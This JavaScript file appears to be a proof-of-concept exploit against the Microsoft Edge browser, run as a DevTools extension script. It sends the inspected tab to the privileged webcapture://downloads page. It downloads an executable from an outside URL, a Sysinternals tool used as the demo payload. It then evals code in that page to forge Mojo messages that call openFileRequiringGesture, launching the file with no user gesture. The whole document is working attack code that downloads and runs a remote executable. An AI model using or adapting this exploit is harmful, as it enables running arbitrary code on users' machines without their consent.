const downloadUrl = "https://live.sysinternals.com/procexp.exe";

startProcess();

function startProcess() {
    if (!chrome.devtools.inspectedWindow.tabId) {
        return;
    }

    chrome.devtools.network.onNavigated.addListener(function navigationListener(url) {
        if (url === "webcapture://downloads/") {
            chrome.devtools.network.onNavigated.removeListener(navigationListener);

            onTargetNavigatedToWebCapturePage();
        }
    });

    // The above addListener call will result in a channel message being sent to the DevTools. That
    // message will be processed asynchronously. Without any timeout here, it's possible the tab
    // navigation would complete before the DevTools actually processed the addListener message,
    // meaning the navigation would be missed.
    // Therefore, some time is given for the channel message to be processed first, before the tab
    // is navigated.
    setTimeout(() => {
        chrome.tabs.update(chrome.devtools.inspectedWindow.tabId, {url: "webcapture://downloads/"});
    }, 1000);
}

function onTargetNavigatedToWebCapturePage() {
    // Although the downloads API is used here, it should be possible to determine the download ID
    // by calling the appropriate Mojo method on webcapture://downloads instead. However, doing so
    // would make the demonstration more complex.
    chrome.downloads.download({url: downloadUrl}, function (downloadId) {
        chrome.devtools.inspectedWindow.eval(`(${openDownloadViaWebCapturePage.toString()})` +
            `(${downloadId})`);
    });
}

// Note that this entire function and its nested functions are run within the context of
// webcapture://downloads.
function openDownloadViaWebCapturePage(downloadId) {
    // See:
    //
    // https://source.chromium.org/chromium/chromium/src/+/main:mojo/public/js/bindings_lite.js;l=18;drc=e8cf02865e0c0fe74cab2b30a0a7c8a87eaa4fc3
    const v0MojoHeaderSize = 24;

    const littleEndian = isHostLittleEndian();

    retrieveDownloadsMojoFile();

    function retrieveDownloadsMojoFile() {
        // fetch doesn't support the webcapture: scheme, so use XMLHttpRequest instead.
        let xhr = new XMLHttpRequest();
        xhr.open("GET", "webcapture://downloads/downloads.mojom-lite.js");
        xhr.responseType = "text";
        xhr.onload = function () {
            if (xhr.readyState === xhr.DONE && xhr.status === 200) {
                onDownloadsMojoFileRetrieved(xhr.responseText);
            }
        };
        xhr.send();
    }

    function onDownloadsMojoFileRetrieved(fileText) {
        // These ordinals are set at build time:
        //
        // https://source.chromium.org/chromium/chromium/src/+/master:mojo/public/tools/bindings/mojom_bindings_generator.py;l=106;drc=2aa0429818a0a8bcfa1000478ea620561e927656
        //
        // Therefore, that's the reason they're dynamically read from downloads.mojom-lite.js,
        // rather than being hardcoded.
        let createPageHandlerMatches = fileText.match(/createPageHandler\(\n.*\n.*\n.*\n\s*(?<ordinal>\d+),/);
        let openFileRequiringGestureMatches = fileText.match(/openFileRequiringGesture\(\n.*\n.*\n\s*(?<ordinal>\d+),/);

        if (!createPageHandlerMatches || !openFileRequiringGestureMatches) {
            return;
        }

        onMojoOrdinalsRetrieved(createPageHandlerMatches.groups.ordinal,
            openFileRequiringGestureMatches.groups.ordinal);
    }

    // webcapture://downloads will have WebUI bindings, but won't properly load. That's because it
    // has no ability to load from edge://resources. While it is possible to load the script files
    // from webcapture://resources instead, it wouldn't be possible to include those scripts on the
    // page, due to the content security policy that's used.
    // Therefore, the downloaded file will be opened by calling the appropriate Mojo methods
    // manually. That's more complex, but in this case, only two methods need to be called: (1)
    // createPageHandler and (2) openFileRequiringGesture.
    function onMojoOrdinalsRetrieved(createPageHandlerOrdinal, openFileRequiringGestureOrdinal) {
        let pagePipe = Mojo.createMessagePipe();
        let pageHandlerPipe = Mojo.createMessagePipe();

        sendCreatePageHandlerMessage(createPageHandlerOrdinal, pagePipe, pageHandlerPipe);
        sendOpenFileRequiringGestureMessage(openFileRequiringGestureOrdinal, pageHandlerPipe,
            downloadId);
    }

    function sendCreatePageHandlerMessage(ordinal, pagePipe, pageHandlerPipe) {
        let pipe = Mojo.createMessagePipe();
        Mojo.bindInterface("downloads.mojom.PageHandlerFactory", pipe.handle1, "context");

        let buffer = new ArrayBuffer(48);
        setupV0Header(buffer, ordinal);

        let dataView = new DataView(buffer, v0MojoHeaderSize);
        dataView.setUint32(0, 24, littleEndian); // Packed size
        dataView.setUint32(4, 0, littleEndian); // Version
        dataView.setUint32(8, 0, littleEndian); // Page handle index
        dataView.setUint32(12, 0, littleEndian); // Version
        dataView.setUint32(16, 1, littleEndian); // Page handler handle index

        pipe.handle0.writeMessage(buffer, [pagePipe.handle1, pageHandlerPipe.handle1]);
    }

    function sendOpenFileRequiringGestureMessage(ordinal, pageHandlerPipe, downloadId) {
        let buffer = new ArrayBuffer(56);
        setupV0Header(buffer, ordinal);

        let encoder = new TextEncoder("utf-8");
        let encodedDownloadId = encoder.encode(downloadId.toString());

        const arrayHeaderSize = 8;
        let arraySize = arrayHeaderSize + encodedDownloadId.length;

        let dataView = new DataView(buffer, v0MojoHeaderSize);
        dataView.setUint32(0, 16, littleEndian); // Packed size
        dataView.setUint32(4, 0, littleEndian); // Version
        setUint64(dataView, 8, 8); // Offset
        dataView.setUint32(16, arraySize, littleEndian);
        dataView.setUint32(20, encodedDownloadId.length, littleEndian);

        let byteOffset = 24;

        // Technically, the size of the buffer depends on how many elements are in the encoded
        // download ID. However, there's 8 bytes available here, so a download ID would have to be
        // more than 8 digits long for that to matter (as each digit is encoded within a character
        // and each character is encoded within a byte).
        for (let element of encodedDownloadId) {
            dataView.setUint8(byteOffset, element);
            byteOffset++;
        }

        pageHandlerPipe.handle0.writeMessage(buffer, []);
    }

    function setupV0Header(buffer, ordinal) {
        const version = 0;
        const interfaceId = 0;
        const flags = 0;

        // Taken from:
        //
        // https://source.chromium.org/chromium/chromium/src/+/main:mojo/public/js/bindings_lite.js;l=313;drc=e8cf02865e0c0fe74cab2b30a0a7c8a87eaa4fc3
        let header = new DataView(buffer);
        header.setUint32(0, v0MojoHeaderSize, littleEndian);
        header.setUint32(4, version, littleEndian);
        header.setUint32(8, interfaceId, littleEndian);
        header.setUint32(12, ordinal, littleEndian);
        header.setUint32(16, flags, littleEndian);
        header.setUint32(20, 0);  // Padding
    }

    // Taken from:
    //
    // https://source.chromium.org/chromium/chromium/src/+/main:mojo/public/js/bindings_lite.js;l=93;drc=e8cf02865e0c0fe74cab2b30a0a7c8a87eaa4fc3
    function setUint64(dataView, byteOffset, value) {
        if (littleEndian) {
          dataView.setUint32(
              byteOffset, Number(BigInt(value) & BigInt(0xffffffff)),
              littleEndian);
          dataView.setUint32(
              byteOffset + 4,
              Number((BigInt(value) >> BigInt(32)) & BigInt(0xffffffff)),
              littleEndian);
        } else {
          dataView.setUint32(
              byteOffset, Number((BigInt(value) >> BigInt(32)) & BigInt(0xffffffff)),
              littleEndian);
          dataView.setUint32(
              byteOffset + 4, Number(BigInt(value) & BigInt(0xffffffff)),
              littleEndian);
        }
      };

    // Taken from:
    //
    // https://source.chromium.org/chromium/chromium/src/+/main:mojo/public/js/bindings_lite.js;l=42;drc=e8cf02865e0c0fe74cab2b30a0a7c8a87eaa4fc3
    function isHostLittleEndian() {
        const wordBytes = new Uint8Array(new Uint16Array([1]).buffer);
        return !!wordBytes[0];
    };
}